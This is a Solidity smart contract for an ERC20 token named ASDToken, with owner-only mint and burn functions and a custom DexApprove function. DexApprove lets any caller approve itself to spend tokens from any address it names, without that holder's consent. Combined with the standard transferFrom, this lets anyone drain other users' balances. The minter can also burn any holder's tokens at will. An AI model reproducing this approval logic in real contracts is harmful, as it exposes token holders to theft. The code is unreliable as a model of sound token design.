// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./IASDToken.sol";

contract ASDToken is IASDToken, ERC20("ASDToken", "ASD"){
    address public minter;
    uint public _decimal;
    constructor() {
        minter = msg.sender;
        _decimal = 10 ** decimals();
        // _mint(msg.sender, 10000 * _decimal);

    }

    function mint(address to, uint256 amount) external virtual override {
        require(msg.sender == minter, "Alert : Only Owner");
        _mint(to, amount * _decimal);
    }

    function burn (address to, uint256 amount) external virtual override {
        require(msg.sender == minter, "Alert : Only Owner");
        _burn(to, amount * _decimal);
    }

    function DexApprove(address from, uint256 amount) public virtual override returns(bool) {
        address spender = _msgSender();
        _approve(from, spender, amount);
        return true;
    }

}